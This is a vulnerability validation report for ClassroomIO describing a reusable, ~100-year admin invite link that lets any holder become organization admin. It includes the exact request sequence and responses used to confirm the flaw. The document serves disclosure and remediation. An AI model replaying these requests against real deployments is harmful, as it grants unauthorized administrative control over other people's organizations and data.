# VULN-017 — Reusable, non-expiring ADMIN link-invite → permanent org takeover

**Software**: ClassroomIO
**Repository**: https://github.com/classroomio/classroomio
**Affected version**: 0.1.13 (package.json) — commit-pinned
**Target commit**: 0c356ad6f1a4d8449425b902afae58b3ebd9f443
**Status**: CONFIRMED
**Severity (static)**: High (CVSS 3.1 7.5 — `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N`)
**Validated at**: 2026-09-27

## Preconditions
- An org admin session (to create the link and read its token). The admin `admin@cvehunt.local`
  was used.
- The redeemers are **fresh accounts with no prior privilege** — created at runtime via the
  normal signup API (`signup()`), each with a random suffix.

## Request
See `request.http`. Decisive sequence:
```
POST /organization/link-invite      {"roleId":1}          (admin)   → returns raw token
GET  /organization/link-invite                            (admin)   → returns the SAME raw token
POST /invite/link/<token>/accept    {}                    (fresh U1) → U1 becomes org ADMIN
POST /invite/link/<token>/accept    {}                    (fresh U2) → U2 also becomes org ADMIN
```

## Response
- `POST /organization/link-invite {"roleId":1}` → `200`, `data.roleId=1`, `data.token="D2LNpExP…Kmefyg"`
  (the raw token, not a hash).
- `GET /organization/link-invite` → `200`, `data.token` equals the created token (raw disclosure).
- Both accepts → `200` `{"success":true,"data":{"organizationId":"48bbdff8…","roleId":1,"redirectTo":"/org/cve-hunt-academy"}}`.

## Observation
The static finding is confirmed end-to-end and live:
1. `getOrCreateLinkInvite` accepted `roleId=ADMIN` (returned `roleId:1`).
2. `GET /organization/link-invite` returned the **raw** token (cleartext disclosure to any org admin).
3. Two independent fresh accounts each redeemed the **same** token and both became **org ADMIN** —
   verified in the live session (`orgRoles[org]=1`) **and** as ground truth in the DB
   (`organizationmember.role_id=1` for both users). The invite is not consumed on accept
   (reusable) and has a ~100-year expiry, so a single leaked link is a permanent, reusable
   admin credential.

## Side effects
- Two throwaway users (`u_5e3290c6@…`, `u_4ae377ab@…` on the recorded run; random each run) were
  promoted to org ADMIN. They are inert extra admins. An ADMIN link-invite now exists for the
  org (get-or-create); it can be revoked from Org Settings if desired.
- No data destroyed; all state created via the app's own API.

## Research & references
- OWASP WSTG-ATHZ (Authorization) / CWE-284 Improper Access Control; CWE-522 Insufficiently
  Protected Credentials (raw token echoed by the API and stored in `metadata.token`).
- Invitation-token best practice (short-lived, single-use, bound to invitee, least-privilege
  role): the invite here violates all four.

## If FAILED
n/a — CONFIRMED.

## If NEEDS_MANUAL
n/a. (If the org already had a non-ADMIN link invite, `getOrCreateLinkInvite` returns that one;
the exploit detects this and would report NEEDS_MANUAL. On a fresh org the ADMIN branch is
exercised directly, as here.)
